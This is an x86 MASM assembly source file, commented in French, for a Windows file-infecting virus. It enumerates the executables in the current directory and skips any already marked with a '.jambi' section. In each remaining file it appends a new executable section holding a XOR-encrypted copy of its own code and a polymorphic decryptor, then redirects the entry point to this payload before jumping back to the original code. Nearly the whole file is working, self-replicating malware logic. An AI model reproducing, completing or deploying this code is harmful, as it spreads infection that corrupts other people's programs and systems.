	.386
	.model flat, stdcall
	option casemap:none

	include		\masm32\include\windows.inc
	include \masm32\include\user32.inc
	include \masm32\include\kernel32.inc
	include \masm32\include\msvcrt.inc
	
	
	includelib \masm32\lib\user32.lib
	includelib \masm32\lib\kernel32.lib
	includelib \masm32\lib\msvcrt.lib
	include		getdynamicfunc.asm
	


	.code

	; ------------------------
	;      	   FILE
	; ------------------------
	; file_size	|	4 octets
	; key		|	2 octets (null terminator compris)
	; un_crypt	|
	; xored_code	|
	; ------------------------


;; ---------------------------------------------

crypt:						; retourne la chainne malloc et xor
	push 	ebp
	mov 	ebp, esp
	sub 	esp, 4096
	call	peb				; creation stake frame

	;; ;; -------------------------------------
	;; push	0		; xaxa          |
	;; push	[ebp - 500]	;               |
	;; push	[ebp + 8]	;               |
	;; push	0		;               |
	;; call	dword ptr [ebp - 268] ;         |
	;; ;; -------------------------------------
; nop
; nop
	mov 	eax, [ebp + 12]
	sub 	eax, [ebp + 8]
	mov 	[ebp - 12], eax			;len(sh)

	push 	eax
	call 	dword ptr [ebp - 308]		; __cdecl__malloc
	add 	esp, 4
	
	cmp 	eax, 0
	je 	malloc_error			; eax = &malloced_buffer

	mov 	[ebp - 8], eax 			; allocated area

	;; on recopie la chaine dans le malloc
	push 	[ebp - 12]
	push 	[ebp + 8]
	push 	eax
	call 	dword ptr [ebp - 276]		; crt_memcpy
	add	esp, 12

	mov	eax, [ebp + 16]			; eax == &key
	mov	ecx, [ebp - 12]			; ecx == strlen(sh)
	mov	edx, [ebp - 8]			; edx == &sh
	;; add	ecx, edx			; ecx == &end_sh

	;; push	ecx
	;; push	[ebp - 524]
	;; call	dword ptr [ebp - 280]

crypting:
	mov	bl, [edx]			; edi pointe sur le carac courant
	push	eax
	mov	eax, [eax]
	xor	bl, al				; on le xor avec la cle
	pop	eax
	mov	[edx], bl			; on ecrase le carac courant
	;; mov	edi, [edx]			; edi pointe sur le carac courant
	;; xor	edi, [eax]			; on le xor avec la cle
	;; mov	[edx], edi			; on ecrase le carac courant

	inc	edx
	dec	ecx
	cmp 	ecx, 0
	jne	crypting
	mov	eax, [ebp - 8]
	;; xqxq
	;; ;; -------------------------------------
	;; push	0		; xaxa          |
	;; push	[ebp - 500]	;               |
	;; push	eax		;               |
	;; push	0		;               |
	;; call	dword ptr [ebp - 268] ;         |
	;; ;; -------------------------------------
	leave
	ret 	12				; on retourne l'adresse de la chaine malloc

malloc_error:
	push 	1
	call 	dword ptr [ebp - 236]		; ExitProcess

	;get_sh()
	; out EAX  = &beg_sh (debut du shellcode)
	; out EBX  = size du shellcode
get_sh:
	call	get_sh2
get_sh2:
	pop	ecx				; delta
	;; mov	ebx, end_sh
	;; mov	eax, beg_sh
	;;  					; eax contient beg
	;; sub	ebx, eax			; ebx contient strlen(sh)
	mov	eax, end_sh - beg_sh
	mov	[ebp - 3900], eax		; strlen(sh)
	;; ----
	;; mov	eax, beg_sh
	;; mov	edx, get_sh2
	;; sub	edx, eax			; edx = get_sh2 - beg_sh
	mov	edx, get_sh2 - beg_sh
	sub	ecx, edx			; ecx = s_eip - edx (debut effectif du sh)
	mov	[ebp - 3904], ecx		; beg_shellcode effectif
	;; mov	eax, ecx			; on le met dans eax ;D

	;; ----------------
	;;    on crypt	   |
	;; ----------------
	mov	edi, [ebp - 3900]
	add	edi, [ebp - 3904]		; edi = end_sh
	push	[ebp - 544]			; cle
	push	edi				; end_code
	push	[ebp - 3904]			; beg_code
	call	crypt

	;; mov	edi, [ebp - 3900]
	;; add	edi, eax		; edi = end_sh
	;; push	[ebp - 544]			; cle
	;; push	edi				; end_code
	;; push	eax			; beg_code
	;; call	crypt

	;; ;; -------------------------------------
	;; push	0		; xaxa          |
	;; push	[ebp - 500]	;               |
	;; push	eax	;               |
	;; push	0		;               |
	;; call	dword ptr [ebp - 268] ;         |
	;; ;; -------------------------------------

	mov	ebx, [ebp - 3900]
	;; mov	eax, 1
	ret

_error1:
	;; push	offset	error_CreateFile
	;; push	offset	format_string
	;; call	dword ptr [ebp - 280]			 ;printf
	leave
	ret	4

_error2:
	;; push	offset	error_CreateFileMapping
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]			;printf
	push	[ebp - 4]
	call 	dword ptr [ebp - 296]			;CloseHandle(handle)
	leave
	ret	4

_error3:
	;; push	offset error_MapViewOfFile
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]			;printf
	;; mov	edx, [ebp + 8]
	;; push	edx
	;; push	offset format_text
	;; call	dword ptr [ebp - 280]			;printf
	push	[ebp - 4]
	call	dword ptr [ebp - 296]			;CloseHandle
	push	[ebp - 8]
	call	dword ptr [ebp - 296]			;CloseHandle
	leave
	ret	4

_error4:
	;; push	offset error_PE_format
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]			;printf
	leave
	ret	4

_error5:
	;; push	offset error_PE_format
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]			;printf
	leave
	ret	4

_error6:
	;; push	offset error_Invalid_Handle_Value
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]			;printf
	leave
	ret	4

_error7:
	;; push	offset error_Invalid_Set_FP
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]			;printf
	leave
	ret	4

_error8:
	;; push	offset error_Write_File
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]			;printf
	leave
	ret	4

_error9:
	;; push	offset error_Close_Handle
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]			;printf
	leave
	ret	4

_error10:
	;; push	offset error_Close_Handle
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]			;printf
	leave
	ret	4

_error11:
	;; push	offset error_Find_First_File
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]			;printf

	leave
	ret	4

_error13:
	;; push	offset error_Stack_Overflow
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]			;printf
	leave
	ret	4

is_zero_long:			;is_zero_long(chaine, taille)
	push	ebp
	mov	ebp, esp

	mov	edx, [ebp + 8]	;chaine
	mov	ecx, [ebp + 12]	;taille
	xor	eax, eax
o1:
	cmp	[edx], eax
	jne	o2
	dec	ecx
	inc	edx
	loop	o1
	dec	eax
o2:
	inc	eax
	leave
	ret	8


				; alignment => ebp + 8
				; value => ebp + 12
alignment:
	push	ebp
	mov	ebp, esp

	xor	edx, edx
	mov	eax, [ebp + 12]
	mov	ecx, [ebp + 8]

	div	ecx

	or	edx, edx
	je	alignment_done

	inc	eax
	imul	eax, [ebp + 8]

	jmp	alignment_exit

alignment_done:
	mov	eax, [ebp + 12]

alignment_exit:
	leave
	ret	8

	;Prototype: isHealthy(number of sections, PIMAGE_NT_HEADERS, (*)strncmp)
isHealthy:
	push	ebp
	mov	ebp, esp

	sub	esp, 4

	mov	ecx, [ebp + 8]			;
	mov	ebx, [ebp + 12]			;

	add	ebx, 248

isHealthy_loop:
	or	ecx, ecx
	je	isHealthy_endloop

	mov	[ebp - 4], ecx

	push	7
	push	[ebp + 20]			; offset sectionName
	push	ebx
	call	dword ptr [ebp + 16]		; strncmp(".jambi", sectionName, 7)
	add	esp, 12


	or	eax, eax
	je	already_infected

	mov	ecx, [ebp - 4]

	add	ebx, 40
	dec	ecx
	jmp	isHealthy_loop

already_infected:
	mov	eax, 0
	jmp	isHealthy_end

isHealthy_endloop:
	mov	eax, 1

isHealthy_end:
	leave
	ret		16

; bool infect(FileName : used) //, hFindFile, &strDupA)
; true if failed...
infect:
	push	ebp
	mov	ebp, esp
	;---------------------------------------------------------------------------------
	; EBP					4
	;---------------------------------------------------------------------------------
	; HANDLE				4	return of CreateFile
	; HANDLE				8	return of CreateFileMapping
	; LPVOID 				12	return of MapViewOfFile
	; PIMAGE_NT_HEADERS			16
	; PIMAGE_SECTION_HEADER			20
	; DWORD					24	OptionalHeader.AddressOfEntryPoint
	; DWORD					28	OptionalHeader.SectionAlignment
	; DWORD					32	OptionalHeader.FileAlignment
	; HANDLE				36	return of CreateFile
	; DWORD					40	pointerToRawData
	; DWORD					44
	; 					48
	; DWORD					52	&payload
	; DWORD					56	payload_size
	; DWORD					60	payload_size + 4

	;---------------------------------------------------------------------------------
	; Our section
	;---------------------------------------------------------------------------------
	; PSECTION->Misc.VirtualSize		8	dword
	; PSECTION->VirtualAddress		12	dword
	; PSECTION->SizeOfRawData		16	dword
	; PSECTION->PointerToRawData		20	dword
	; PSECTION->PointerToRelocations	24	dword
	; PSECTION->PointerToLinenumbers	28	dword
	; PSECTION->NumberOfRelocations		32	dword
	; PSECTION->NumberOfLinenumbers		34	word
	; PSECTION->Characteristics		36	word
	;---------------------------------------------------------------------------------
	sub	esp, 4096

	push	[ebp + 8] 			;FileName
	call	dword ptr [ebp + 12]		;StrdupA(fileName)
	cmp	eax, NULL
	je	_exit_without_exitprocess	;because we can't printf
	mov	[ebp + 3800], eax		;Copy of FileName

	call	peb
	mov	ebx, [ebp + 3800]		; ebx = CopyOfFileName
	mov	[ebp + 8], ebx			; FileName = CopyOfFileName (lolz peluche hack!)


	jmp	polymorpher
	end_poly:
	mov	[ebp - 800], ecx		;len size
	mov	[ebp - 804], eax		;malloced generated decryptor


	
	; push	ecx
	; push	eax
	; push	dword ptr [ebp - 508]
	; call	dword ptr [ebp - 280] 		;invoke printf
	; add	esp, 12
	; push	666d
	; call	dword ptr [ebp - 236]
	
	call	get_sh
	mov	[ebp  - 52], eax		; [ebp - 52] = &debut du shellcode
	mov	[ebp  - 56], ebx		; saving payloadsize

	add	ebx, [ebp - 800]		;+= uncrypt_len
	add	ebx, 12				; shellcodelen += sizeof(nop + jmp + addr)
	mov	[ebp  - 60], ebx 		; [ebp-60]TOTAL size = shellcode size + jump size

	


	; CreateFile
	push	0
	push	0
	push	OPEN_EXISTING
	push	NULL
	push	FILE_SHARE_READ or FILE_SHARE_WRITE
	push	GENERIC_READ or GENERIC_WRITE
	push	[ebp + 8]
	call	dword ptr [ebp - 228] 		; CreatFile(FileName, RW, RW, NULL, OPEN_EXISTING,0,0)


	cmp	eax, INVALID_HANDLE_VALUE
	je	_error1

	mov	[ebp - 4], eax			; [ebp - 4] = Handle sur le fichier

	; CreateFileMapping
	push	NULL
	push	0
	push	0
	push	PAGE_READWRITE
	push	NULL
	push	eax
	call	dword ptr [ebp - 232]		; CreateFileMapping(handle, null, RW, 0,0,null)

	cmp	eax, NULL
	je	_error2

	mov	[ebp - 8], eax			; [ebp-8] = handleMapFile

	; MapViewOfFile
	push	0
	push	0
	push	0
	push	FILE_MAP_ALL_ACCESS
	push	eax
	call	dword ptr [ebp - 252]		; MapViewOfFile(handleMapFile, ALL,0,0,0)

	cmp	eax, NULL
	je	_error3

	mov	[ebp - 12], eax			; [ebp -12] = handleMapViewOfFile

	mov	edx, [eax]

	; acces au champs e_magic
	cmp	dx, IMAGE_DOS_SIGNATURE
	jne	_error4

	; infosExecutable + infosExecutable->e_lfanew
	add	eax, 60

	; recupere la valeur du long (e_lfanew)
	mov	edx, [eax]

	; recupere l'addresse du PIMAGE_DOS_HEADER
	sub	eax, 60

	; ajoute l'offset pour recuperer l'addresse du PIMAGE_NT_HEADERS
	add	eax, edx

	mov	edx, [eax]

	; acces au champs Signature
	cmp	edx, IMAGE_NT_SIGNATURE
	jne	_error5

	; saving PIMAGE_NT_HEADERS
	mov	[ebp - 16], eax

	; sizeof IMAGE_NT_HEADERS <=> 248
	; sizeof IMAGE_SECTION_HEADER <=> 40
	add	eax, 6

	; accessing number of sections
	xor	ecx, ecx
	mov	cx, [eax]

	mov	edx, ecx 		; LEFLOU LE HACKZOR PATCH :  saving number of sections for calling isHealthy

	sub	eax, 6

	; number of sections * IMAGE_SECTION_HEADER
	imul	ecx, 40
	add	ecx, eax

	add	ecx, 248

	; PIMAGE_SECTION_HEADER
	mov	[ebp - 20], ecx

	;~~~~~~~~~~~~~~~~~~~~
	; Check if the binary is healthy
	;~~~~~~~~~~~~~~~~~~~~
	push	[ebp - 504]		; .jambi
	push	[ebp - 288]		; strncmp
	push	[ebp - 16]
	push	edx
	call	isHealthy

	or	eax, eax
	jne	checking_space
	mov	eax, 1 			; infection failed.

	leave
	ret	8			;!Infect()fin

checking_space:
	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	; checking space
	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	mov	edx, [ebp - 20]

	push	40
	push	edx
	call	is_zero_long

	or	eax, eax
	je 	proceed_to_infection

	; ----------------------------------------------
	leave			;   disable inJection    |
	ret	12		;   disable inJection    |
	; ----------------------------------------------


proceed_to_infection:
	;~~~~~~~~~~~~~~~~~~~
	; increment number of sections
	;~~~~~~~~~~~~~~~~~~~
	mov	edx, [ebp - 16]
	add	edx, 6

	xor	ecx, ecx
	mov	cx, [edx]
	inc	cx
	mov	[edx], ecx

	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	; Increasing OptionalHeader.SizeOfImage
	; payload_size is the new section size
	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	
	
	mov	edx, [ebp - 16]
	add	edx, 80

	mov	ecx, [edx]

	mov	eax, [ebp  - 60]
	add	cx, ax
	mov	[edx], ecx

	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	; Retrieving	AddressOfEntryPoint
	; 					SectionAlignment
	; 					FileAlignment
	; from PIMAGE_NT_HEADERS
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

	mov	ebx, [ebp - 16]
	add	ebx, 52 			; offset to ImageBase
	mov	edx, [ebx]

	sub	ebx, 12 			; offset to AddressOfEntryPoint
	mov	ecx, [ebx]

	add	edx, ecx
	mov	[ebp - 24], edx 		; stocking REAL AddressOfEntryPoint

	add	ebx, 16 			; offset to SectionAlignment
	mov	edx, [ebx]
	mov	[ebp - 28], edx

	add	ebx, 4 				; offset to FileAlignment
	mov	edx, [ebx]
	mov	[ebp - 32], edx

	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	; Creating new section
	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	mov	edx, [ebp - 20]

	push	dword ptr [ebp - 504] 		; section name (.jambi)
	push	edx
	call 	dword ptr [ebp - 284]		; crt_strcpy
	add	esp, 8				; cleanup stack => cdecl

	; Setting our section datas
	mov	ebx, [ebp - 20]
	; Setting Misc.VirtualSize -> AligneSur(sectionAlignment,tailleSection);
	;push payload_size ; shell code size + dword jump to old entry point

	mov	eax, [ebp  - 60]
	push	eax
	push	[ebp - 28]
	call	alignment

	add	ebx, 8				; Goto Misc.VirtualSize
	mov	[ebx], eax

	; Setting VirtualAddress -> AligneSur(sectionAlignment,(infosSection->VirtualAddress + infosSection->Misc.VirtualSize));
	mov	ebx, [ebp - 20]
	sub	ebx, 40 			; jumping to Jambi's previous section

	add	ebx, 8 				; accessing Misc.VirtualSize

	mov	eax, [ebx]
	add	ebx, 4 				; accessing VirtualAddress
	add	eax, [ebx]

	push	eax
	push	[ebp - 28]
	call	alignment

	add	ebx, 40 			; jumping to Jambi section
	mov	[ebx], eax 			; setting jambi virtual address

	; Setting  SizeOfRawData = AligneSur(fileAlignment,tailleSection);
	add	ebx , 4

	mov	eax, [ebp  - 60]
	push	eax
	push	[ebp - 32]
	call	alignment

	mov	[ebx], eax

	; Setting  PointerToRawData -> AligneSur(fileAlignment,(infosSection->SizeOfRawData + infosSection->PointerToRawData));
	sub	ebx, 40
	mov	edx, [ebx]

	add	ebx , 4
	add	edx, [ebx]

	push	edx
	push 	[ebp - 32]
	call	alignment

	add	ebx, 40
	mov	[ebx], eax


	xor	eax, eax
		; PointerToRelocations = 0;
	add	ebx, 4
	mov	[ebx], eax
		; PointerToLinenumbers = 0;
	add	ebx, 4
	mov	[ebx], eax
		; NumberOfRelocations = 0;
	add	ebx, 4
	mov	[ebx], eax
	    ;NumberOfLinenumbers = 0;
	add	ebx, 2
	mov	[ebx], eax
	; Caracteritics
	add	ebx, 2
	mov	edx, IMAGE_SCN_MEM_READ
	add	edx, IMAGE_SCN_MEM_WRITE
	add	edx, IMAGE_SCN_MEM_EXECUTE
	mov	[ebx], edx

	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	; Setting new entry point
	;~~~~~~~~~~~~~~~~~~~~~~~~~~

	mov	ebx, [ebp - 16]
	add	ebx, 40				; offset to AddressOfEntryPoint

	mov	edx, [ebp - 20]
	add	edx, 12

	mov	eax, [edx]
	add	eax, 6		;on decale l entry poitn poru sauter sizeof + cle
	mov	[ebx], eax

	; saving PointerToRawData from our section
	mov	edx, [ebp - 20]
	add	edx, 20
	push	[edx]
	pop	[ebp - 40]

	; calcul de l'addresse pour copier l'addresse du jump
	mov	edx, [ebp - 20] 		; PIMAGE_SECTION_HEADER
	add	edx, 12
	mov	edx, [edx]

	mov	eax, [ebp - 16]
	add	eax, 52 			; offset to ImageBase
	mov	eax, [eax]
	add	edx, eax

	mov	eax, [ebp  - 60]
	add	edx, eax

	mov	eax, [ebp - 24]

	sub	eax, edx
	mov	[ebp - 44], eax

	; Clean up all
	push	[ebp - 12]
	call	dword ptr [ebp - 260] 		; UnmapViewOfFile

	push	[ebp - 8]
	call	dword ptr [ebp - 296]		; CloseHandle
	cmp	eax, 0
	je	_error9

	push	[ebp - 4]
	call	dword ptr [ebp - 296]		; CloseHandle
	cmp	eax, 0
	je	_error10

	;-------------------------------------------------------
	; CreateFile
	xor 	ebx, ebx

	push	ebx				; ebx is null
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_ALWAYS
	push	ebx 				; ebx is null
	push	FILE_SHARE_WRITE
	push 	GENERIC_WRITE
	push 	[ebp + 8]
	call	dword ptr [ebp - 228]		; CreateFile

	cmp	eax, INVALID_HANDLE_VALUE
	je	_error6

	mov	[ebp - 36], eax

	; SetFilePointer(fp,pointerToRaw,0,FILE_BEGIN);
	push	FILE_BEGIN
	push	ebx
	push	[ebp - 40]
	push	eax
	call	dword ptr [ebp - 256]		; SetFilePointer

	cmp	eax, INVALID_SET_FILE_POINTER
	je	_error7
	cmp	eax, 0 				; ebx is null
	jb	_error7

	mov	edx, ebp
	sub	edx, 8

	;; -------------------------------------

	; WriteFile filesize en debut de section
	mov	eax, end_sh - beg_sh
	mov	[ebp - 3950], eax
	mov	eax, ebp
	sub	eax, 3950

	push	0
	push	edx				;dummy
	push	4
	push	eax				;
	push	[ebp - 36]			;hFile
	call	dword ptr [ebp - 264]		;WriteFile()

	cmp	eax, 0
	jb	_error8

	mov	edx, ebp
	sub	edx, 8 				; dummy

	; Write key	a la suite
	push	0
	push	edx
	push	2
	push	[ebp - 544]
	push	[ebp - 36]
	call	dword ptr [ebp - 264]		; WriteFile

	cmp	eax, 0	 			
	jb	_error8

	
	; push	[ebp - 800]
	; push	[ebp - 804]
	; push	dword ptr [ebp - 508]
	; call	dword ptr [ebp - 280] 		;invoke printf
	; add	esp, 12
	
	; push	99d
	; call	dword ptr [ebp - 236]
	
	;lea	edx, [ebp - 8]	
	mov	edx, ebp
	sub	edx, 8 				; dummy	


	push	0
	push	edx				;dummy
	push	[ebp - 800]			;uncryptor_len
	push	[ebp - 804]			;uncryptor buffer
	push	[ebp - 36]			;hFile
	call	dword ptr [ebp - 264]		;WriteFile(hFile, &uncryptor, len, &dummy, 0)


	cmp	eax, 0 				; ebx is null
	jb	_error8


	mov	edx, ebp
	sub	edx, 8 				; dummy

	mov	eax, ebp
	sub	eax, 44

	;; -------------------------------------

	; WriteFile shellcode
	push	0
	push	edx				;[ebp - 8]
	mov	ecx, [ebp  - 56] 		; shellcode size - jump_size -> sizeof(dword)
	push	ecx
	push	[ebp - 52]
	push	[ebp - 36]
	call	dword ptr [ebp - 264]		; WriteFile

	cmp	eax, 0 				; ebx is null
	jb	_error8

	mov	edx, ebp
	sub	edx, 8 				; dummy

	mov	eax, ebp
	sub	eax, 44

	; WriteFile JMP a la suite du shellcode
	push	0
	push	edx
	push	2
	push	[ebp - 528]			; JMP
	push	[ebp - 36]			; handler
	call	dword ptr [ebp - 264] 		; WriteFile

	cmp	eax, 0 			; ebx is null
	jb	_error8

	mov	edx, ebp
	sub	edx, 8 				; dummy

	mov	eax, ebp
	sub	eax, 44

	; WriteFile entrypoint a la suite du JMP
	push	0
	push	edx				; dummy
	push	4
	push	eax				; old entry point*
	push	[ebp - 36]			; handler
	call	dword ptr [ebp - 264] 		; WriteFile

	cmp	eax, 0 			; ebx is null
	jb	_error8

	mov	ebx, [ebp  - 60]
	push	ebx
	push	[ebp - 32 ]
	call	alignment

	mov	edx, ebx
	mov	ebx, eax
	sub	ebx, edx

	; Filling with nop
	; on complete par des nop pour avoir la meme taille que ce que l'on a mis dans l'entete d'information.
;int finalize(????)
finalize:
	mov	edx, ebp
	sub	edx, 8 				; dummy

	push	0
	push	edx
	push	1
	push	[ebp - 520]
	push	[ebp - 36]
	call	dword ptr [ebp - 264] 		; WriteFile
;; xoxoxo
	cmp	eax, 0 				; ebx is null
	jb	_error8

	dec	ebx
	or	ebx, ebx
	jne	finalize

	push	[ebp - 36]
	call	dword ptr [ebp - 296] 		; CloseHandle

	mov	eax, 42

	leave
	ret	4

; find_first_file(path\*)
find_first_file:
	push	ebp
	mov	ebp, esp

	;Un bon gros buffle
	sub	esp, 4096
	call	peb

	mov	ebx, ebp
	sub	ebx, 512		;allocate some space for our func

	;; FindFirstFile(const TCHAR [] , path\*, WIN32_FIND_DATA lpFindFileData)
	push	ebx
	push	[ebp + 8]
	call	dword ptr [ebp - 240] 		; findFirstFile
						; eax == hFindFile

	cmp	eax, -1
	je	_error11

	mov 	[ebp - 1516], eax		; saving hFindFile
	add	ebx, 44				; ebx pointe sur -> lpFindFileData.cFilename

here:
	push	[ebp - 292]
	push	ebx
	call	infect				; Infect(lpFindFileData.cFilename, &StrDupA)

	push	[ebp - 1516]
	call	find_next_execs			; find_next_execs(HFindFile)

	or	eax, eax
	jnz	short	here			; if (hFinfFile != NULL);
	leave
	ret	4

;HFindFile find_next_execs(hFindFile)
;RETURN eax:::::HfindFile
find_next_execs:

	push	ebp
 	mov	ebp, esp
	sub	esp, 4096
	call	peb

	mov	eax, ebp
	sub	eax, 512			; allocate some space
	push	eax				; WIN32_FIND_DAT
	push	[ebp + 8]			; hFindFile !!
	call	dword ptr [ebp - 300]		; FindNextFile(hFindFile, WIN32_FIND_DATA)

	mov	ebx, ebp
	sub	ebx, 512			; allocate some space on the stack
	add	ebx, 44	
	; ?????????COMMENT???????

	leave
	ret	4

ls:
	push	ebp
	mov	ebp, esp

	sub	esp, 4096			; buffer
	call 	peb

	mov	ebx, ebp
	sub	ebx, 2048			; ls stack use starting at 2048

	push	ebx
	push	512				; taille buffer donne a GetCurrentDirectory
	call	dword ptr [ebp - 244]		; GetCurrentDirectory(512, *FileName)

	push	[ebp - 496]
	push	ebx
	call	dword ptr [ebp - 248]		; __cdecl__strcat(*Filename, "\*")
	add	esp, 8

	push	ebx
 	call	find_first_file			; find_first_file(path + "\*")

	leave
	ret

start:
	push	ebp
	mov	ebp, esp
	sub	esp, 4096
	call	peb

	;; add	ebx, un_end - un_crypt

	;; -------------------------------------
	push	0		; xaxa          |
	push	[ebp - 500]	;               |
	push	[ebp - 540]	;               |
	push	0		;               |
	call	dword ptr [ebp - 268] ;         |
	;; -------------------------------------

	;; push	0
	;; push	un_end - un_crypt
	;; push	[ebp - 524]
	;; call	dword ptr [ebp - 280]
	call	ls

	;; -------------------------------------
	push	0		; xaxa          |
	push	[ebp - 500]	;               |
	push	[ebp - 532]	;               |
	push	0		;               |
	call	dword ptr [ebp - 268] ;         |
	;; -------------------------------------

end_sh:
_exit_without_exitprocess:
	push	42
	call	dword ptr [ebp - 236]
end	start
	

	; push	polymorpher
	; push	polymorpher
	; push	dword ptr [ebp - 508]
	; call	dword ptr [ebp - 280] 		;invoke printf
	;push	66d
	;call	dword ptr [ebp - 236]

